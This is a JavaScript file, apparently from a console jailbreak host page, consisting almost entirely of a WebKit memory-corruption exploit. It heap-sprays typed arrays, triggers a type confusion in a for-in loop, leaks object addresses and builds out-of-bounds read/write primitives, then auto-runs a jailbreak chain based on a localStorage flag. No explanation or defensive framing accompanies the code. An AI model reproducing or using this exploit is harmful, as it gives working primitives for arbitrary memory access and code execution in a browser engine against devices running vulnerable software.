var leaker_obj = {'a': 0};var leaker_arr = new Uint32Array(6);var oob_slave = new Uint8Array(1024);var oob_master = new Uint32Array(7);var target = {'a': 2.1100820415101592e-303, 'b': false, 'c': true, 'd': 5678};var spray = [];function spray_one(){var x = new Uint32Array(1);x[spray.length+'spray'] = 123;spray.push(x);};for(var i = 0; i < 0x10000; i++)spray_one();var impl_idx = 0;function create_impl(){var ans = {'a': target}; ans[(impl_idx++)+'x'] = {};ans[(impl_idx++)+'x'] = {};return ans;};function trigger(x){var o = {'a': 1}; for(var i in o){{i = x;function i(){return i;};};o[i]; };if(impl.a != target){target.c = leaker_obj;leaker_obj.a = leaker_obj;var l1 = impl.a[4];var l2 = impl.a[5];leaker_obj.a = oob_slave;var s1 = impl.a[4];var s2 = impl.a[5];target.c = leaker_arr;impl.a[4] = l1;impl.a[5] = l2;target.c = oob_master;impl.a[4] = s1;impl.a[5] = s2;impl.a = target;throw "exploit finished";};};/*var target2 = {'a': 2.1100820415101592e-303, 'b': false, 'c': true, 'd': 5678};*/try{var impl = create_impl(); var s = {'a': impl};trigger(s);WK=0;}catch(e){WK=1;}
...
window._HEN.style.display='block';
autojb_status = localStorage.getItem("autojb_status")||0;
var checkBox = document.getElementById("chk");
checkBox.checked = autojb_status;
if(autojb_status == 1)
{
    run();
}